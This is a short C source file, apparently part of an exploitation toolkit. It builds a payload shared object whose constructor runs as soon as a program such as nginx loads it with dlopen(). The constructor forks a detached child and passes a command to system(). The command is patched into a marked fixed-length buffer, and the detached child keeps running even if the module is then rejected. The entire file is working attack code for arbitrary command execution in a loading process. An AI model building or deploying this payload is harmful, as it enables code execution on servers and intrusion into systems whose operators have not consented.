//go:build ignore

/*
 * Generic command-runner shared object. Loaders that dlopen() a .so before
 * verifying it (nginx ngx_load_module, anything calling dlopen()) execute
 * its constructor regardless of signature, so a payload that fires from
 * __attribute__((constructor)) runs as the loading process before any
 * subsequent rejection. fork+setsid detaches the child so it survives the
 * loader bailing out.
 *
 * The command buffer is fixed-length and anchored by the VC_CMD_BEGIN_
 * marker. Caller modules patch the buffer at runtime by locating the
 * marker in the .so bytes, overwriting from that offset, and null-padding
 * the remainder so the on-disk length stays identical.
 */
#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>

char vc_cmd_payload[2048] =
    "VC_CMD_BEGIN_"
    "PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_"
    "PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_"
    "PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_"
    "PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_";

__attribute__((constructor))
void init(void) {
    if (fork() != 0) {
        return;
    }

    setsid();
    system(vc_cmd_payload);
    _exit(0);
}
